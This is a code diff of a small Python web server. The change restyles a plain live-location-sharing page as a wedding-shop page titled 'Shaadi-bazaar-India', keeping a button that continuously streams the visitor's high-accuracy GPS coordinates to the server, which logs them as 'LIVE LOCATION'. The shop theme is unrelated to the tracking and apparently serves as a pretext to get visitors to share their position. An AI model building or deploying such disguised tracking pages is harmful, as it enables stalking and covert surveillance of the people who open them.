@@ -1,5 +1,4 @@
-import os
-import json
+import os, json
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 PAGE = """<!DOCTYPE html>
@@ -7,158 +6,166 @@ PAGE = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="theme-color" content="#101827">
-<title>Shaadi Bazaar India</title>
+<meta name="theme-color" content="#4a1024">
+<title>Shaadi-bazaar-India</title>
 <style>
 * { box-sizing: border-box; }
 html, body {
-  margin: 0;
-  min-height: 100%;
-  width: 100%;
-  font-family: Arial, sans-serif;
-  background: #101827;
-  color: white;
-}
-html, body {
-  width: 100%;
-  height: 100%;
-  overflow: hidden;
-  overscroll-behavior: none;
-  touch-action: pan-x pan-y;
+  margin: 0; width: 100%; min-height: 100%;
+  font-family: Georgia, serif;
+  background: #4a1024; color: #f9e8bd;
 }
 body {
-  min-height: 100vh;
-  min-height: 100dvh;
-  padding: 0;
+  min-height: 100vh; min-height: 100dvh;
+  display: flex; align-items: center; justify-content: center;
+  padding: 18px; overflow-x: hidden;
 }
-.container {
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
+.page {
+  position: relative;
+  width: 100%; max-width: 430px;
+  min-height: 570px;
+  padding: 38px 22px;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: space-between;
+  text-align: center; overflow: hidden;
+  border: 2px solid #d5ad61;
+  border-radius: 22px;
+  background:
+    radial-gradient(ellipse at 50% 45%, #8c3a4c 0%, #641d36 48%, #3c0c20 100%);
+  box-shadow: 0 18px 55px #180610aa;
 }
-.container {
-  width: 100%;
-  max-width: 390px;
-  text-align: center;
-  padding: 38px 24px;
-  background: #1b293c;
-  border: 1px solid #34445b;
-  border-radius: 20px;
-  box-shadow: 0 15px 40px rgba(0,0,0,.25);
+.page:before, .page:after {
+  content: "✦  ❀  ✦  ❀  ✦";
+  position: absolute; left: 0; right: 0;
+  color: #e6c27b; font-size: 21px; letter-spacing: 9px;
+  opacity: .8;
 }
+.page:before { top: 13px; }
+.page:after { bottom: 13px; }
 h1 {
-  margin: 0 0 14px;
-  font-size: 28px;
-  line-height: 1.25;
+  position: relative; z-index: 2;
+  margin: 12px 0 0;
+  font-size: clamp(27px, 7vw, 34px);
+  color: #ffe5a2;
+  text-shadow: 0 2px 12px #250711;
 }
-.description {
-  color: #c4cfdd;
-  font-size: 14px;
-  line-height: 1.6;
-  margin: 0 0 26px;
+.art {
+  width: 100%; height: 285px;
+  position: relative;
+  display: flex; align-items: center; justify-content: center;
 }
+.art:before {
+  content: "❀";
+  position: absolute; top: 4px; left: 12px;
+  color: #f2d18b; font-size: 42px;
+}
+.art:after {
+  content: "❀";
+  position: absolute; bottom: 0; right: 12px;
+  color: #f2d18b; font-size: 42px;
+}
+.dress {
+  position: absolute; bottom: 12px;
+  width: 150px; height: 225px;
+  background: linear-gradient(145deg,#f7dca0,#a95b35 45%,#6f1835 75%,#f0c879);
+  clip-path: polygon(42% 0,58% 0,65% 19%,77% 30%,100% 100%,0 100%,23% 30%,35% 19%);
+  filter: drop-shadow(0 8px 9px #210712);
+}
+.dress:after {
+  content: "✦ ❀ ✦ ❀ ✦";
+  position: absolute; top: 90px; left: 12px;
+  color: #ffe7a7; font-size: 19px; line-height: 2.3;
+}
+.crown {
+  position: absolute; top: 13px;
+  font-size: 38px; color: #f8d88e;
+}
+.ornament {
+  position: absolute; width: 95px; height: 150px;
+  border: 2px solid #e9c77f; border-radius: 50%;
+  opacity: .55;
+}
+.ornament.left { left: 0; transform: rotate(-25deg); }
+.ornament.right { right: 0; transform: rotate(25deg); }
 button {
-  width: 100%;
-  height: 54px;
-  border: 0;
-  border-radius: 12px;
-  font-size: 16px;
-  font-weight: 700;
-  cursor: pointer;
+  position: relative; z-index: 2;
+  width: 100%; max-width: 310px; height: 58px;
+  border: 1px solid #fff0c3; border-radius: 14px;
+  background: linear-gradient(135deg,#ffe6a5,#c9953e);
+  color: #4a1024; font-size: 17px;
+  font-family: Arial, sans-serif; font-weight: 800;
+  box-shadow: 0 6px 18px #1b061099;
   touch-action: manipulation;
 }
-#start { background: #e7b65c; color: #172033; }
-#stop {
-  margin-top: 12px;
-  background: #34445b;
-  color: white;
-}
-button:disabled { opacity: .55; cursor: not-allowed; }
-#status {
-  min-height: 42px;
-  margin-top: 18px;
-  color: #c4cfdd;
-  font-size: 13px;
-  line-height: 1.5;
-  overflow-wrap: anywhere;
-}
+button:disabled { opacity: .7; }
 </style>
 </head>
 <body>
-<main class="container">
+<main class="page">
   <h1>Shaadi-bazaar-India</h1>
-  <button id="start">Start Live Location</button>
+  <div class="art" aria-hidden="true">
+    <div class="ornament left"></div>
+    <div class="ornament right"></div>
+    <div class="crown">✧</div>
+    <div class="dress"></div>
+  </div>
+  <button id="share">Share My Location</button>
 </main>
-
 <script>
-const startButton = document.getElementById("start");
-const statusBox = null;
+const button = document.getElementById("share");
 let watchId = null;
 let sending = false;
 
-function stopSharing(message) {
-  if (watchId !== null) {
-    navigator.geolocation.clearWatch(watchId);
-  }
+function stopSharing() {
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
   watchId = null;
   sending = false;
-  startButton.disabled = false;
-  statusBox.textContent = message || "Location sharing is off.";
+  button.disabled = false;
+  button.textContent = "Share My Location";
 }
 
-startButton.addEventListener("click", function () {
-  if (!navigator.geolocation) {
-    statusBox.textContent = "This browser does not support location access.";
+button.addEventListener("click", function () {
+  if (watchId !== null) {
+    stopSharing();
     return;
   }
-
-  if (watchId !== null) return;
-
-  startButton.disabled = true;
-  statusBox.textContent = "Waiting for location permission...";
-
-  watchId = navigator.geolocation.watchPosition(
-    async function (position) {
+  if (!navigator.geolocation) {
+    alert("Location is not supported by this browser.");
+    return;
+  }
+  button.disabled = true;
+  navigator.geolocation.getCurrentPosition(function () {
+    button.disabled = false;
+    button.textContent = "Stop Sharing";
+    watchId = navigator.geolocation.watchPosition(async function (pos) {
       if (sending) return;
       sending = true;
-
-      const locationData = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
+      const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
         time: new Date().toISOString()
       };
-
       try {
-        const response = await fetch("/location", {
+        await fetch("/location", {
           method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(locationData)
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify(data)
         });
-
-        if (!response.ok) throw new Error("Server error");
-        startButton.textContent = "Stop Sharing";
-      } catch (error) {
-        console.error("Connection problem.");
+      } catch (e) {
+        console.error("Location update failed", e);
       } finally {
         sending = false;
       }
-    },
-    function (error) {
-      let message = "Unable to get location.";
-      if (error.code === 1) message = "Location permission was denied. Allow it in browser settings.";
-      if (error.code === 2) message = "Location is unavailable. Check your phone GPS.";
-      if (error.code === 3) message = "Location request timed out. Please try again.";
-      stopSharing(); 
-      alert(message);
-    },
-    { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
-  );
-
-  statusBox.textContent = "Please allow location access when your browser asks.";
+    }, function (err) {
+      stopSharing();
+      alert("Location error: " + err.message);
+    }, {enableHighAccuracy:true, maximumAge:0, timeout:20000});
+  }, function (err) {
+    button.disabled = false;
+    alert("Location permission/error: " + err.message);
+  }, {enableHighAccuracy:true, timeout:20000});
 });
-
 </script>
 </body>
 </html>
@@ -170,6 +177,9 @@ class Handler(BaseHTTPRequestHandler):
             self.send_response(204)
             self.end_headers()
             return
+        if self.path.split("?")[0] != "/":
+            self.send_error(404)
+            return
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(PAGE)))
@@ -178,12 +188,7 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(PAGE)
 
     def do_HEAD(self):
-        if self.path.split("?")[0] == "/favicon.ico":
-            self.send_response(204)
-            self.end_headers()
-            return
         self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(PAGE)))
         self.end_headers()
 
@@ -197,14 +202,12 @@ class Handler(BaseHTTPRequestHandler):
                 self.send_error(400)
                 return
             data = json.loads(self.rfile.read(size))
-            lat = float(data["latitude"])
-            lon = float(data["longitude"])
+            lat, lon = float(data["latitude"]), float(data["longitude"])
             if not (-90 <= lat <= 90 and -180 <= lon <= 180):
                 self.send_error(400)
                 return
             print("LIVE LOCATION:", json.dumps(data), flush=True)
             self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
             self.end_headers()
             self.wfile.write(b"OK")
         except Exception:
